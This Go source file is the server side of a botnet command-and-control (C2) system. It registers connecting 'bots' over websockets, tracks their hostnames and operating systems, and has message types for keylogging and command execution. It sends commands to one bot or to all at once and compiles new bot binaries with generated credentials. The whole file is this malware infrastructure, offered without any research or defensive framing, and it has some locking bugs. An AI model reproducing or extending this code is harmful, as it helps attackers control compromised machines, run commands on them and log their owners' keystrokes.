package main

import (
	"c2/server/models"
	"c2/server/register"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

const (
	ERROR_MSG = "error"
	KEYLOGGER = "keylogger"
	EXEC      = "exec"
	HEARTBEAT = "heartbeat"
)

func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
	b := models.Bot{}

	var con *websocket.Conn
	var err error
	if con, err = websocket.Accept(w, r, nil); err != nil {
		log.Println(err)
		return
	}

	ctx := context.Background()
	if err := wsjson.Read(ctx, con, &b); err != nil {
		log.Println("Error reading the initial data of the bot : ", err)
		return
	}
	b.Mu.Lock()
	b.Con = con
	b.LastSeen = time.Now()
	b.Active = true
	c.RegisterBot(b.ID, &b)
	b.Mu.Unlock()

	fmt.Print("BOT ID: ", b.ID, "\nHOSTNAME: ", b.HostName, "\n OS: ", b.OS, "\nLASTSEEN: ", b.LastSeen, "\n")

	go c.listentoBot(&b)

}

func (c *c2) listentoBot(bot *models.Bot) {
	defer func() {
		c.DisconnectBot(bot.ID)
		log.Println("Deleted the Bot: ", bot.ID, "From the global bot list")

	}()

	var msg models.BotMessage
	for {
		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Minute)
		err := wsjson.Read(ctx, bot.Con, &msg)
		cancel()

		if err != nil {
			log.Println("Bot Disconnected/Timeout : ", err)
			return
		}

		bot.UpdateLastseen()

		switch msg.Type {
		case ERROR_MSG:
			bot.Mu.RLock()
			fmt.Println("ERROR MESSAGE FROM BOT : ", bot.ID, "ERROR : ", msg.Message)
			bot.Mu.RUnlock()

		case KEYLOGGER:

		case HEARTBEAT:
			bot.Mu.Lock()
			log.Println("Recieved Heartbeat From Bot : ", bot.ID)
			bot.Mu.RUnlock()
		}

	}
}

func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
	cmd := models.Command{}
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
		return
	}
	json.Unmarshal(body, &cmd)
	// fmt.Println(cmd)

	if cmd.BotID == "*" {
		for _, v := range c.Bots {
			if err = wsjson.Write(context.Background(), v.Con, cmd.CmdType); err != nil {
				log.Println(err)
				continue
			}
			fmt.Println("Command send to bot : ", v.ID)
		}
	} else {
		bot := c.GetBot(cmd.BotID)
		if err = wsjson.Write(context.Background(), bot.Con, cmd.CmdType); err != nil {
			log.Println(err)
			return
		}
		fmt.Println("Command send to bot : ", bot.ID)
	}

} //send  execute command  message by admin
func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	c.Mu.RLock()
	defer c.Mu.RUnlock()
	err := json.NewEncoder(w).Encode(c.Bots)
	if err != nil {
		log.Println("Error sending list of bots : ", err)
		return
	}
	log.Println("List of bots send to dashboard.")
}

func (c *c2) DisconnectBot(botID string) bool {
	exist := true
	bot := c.GetBot(botID)

	if bot == nil {
		exist = false
		log.Println("Bot with id: ", botID, "Dosent Exist")
		return exist
	}

	bot.Mu.Lock()
	if err := bot.Con.Close(websocket.StatusNormalClosure, "Bot Disconnected"); err != nil {
		log.Println("Error closing connection : ", err)
		exist = false
		return exist
	}
	bot.Mu.Unlock()
	c.Mu.Lock()
	delete(c.Bots, botID)
	fmt.Println(c.Bots)
	c.Mu.Unlock()

	return exist
}

func (c *c2) GenerateBot(w http.ResponseWriter, r *http.Request) {

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
		return
	}
	ot := models.Ostype{}

	json.Unmarshal(body, &ot)

	botcreds, err := register.GenerateBotCredentials()
	if err != nil {
		log.Println(err)
		return
	}

	out, err := botcreds.CompileBot(ot)
	if err != nil {
		log.Println("Compilation Failed: ", string(out))
		return
	}

	c.Db.SaveToDB(botcreds)
}
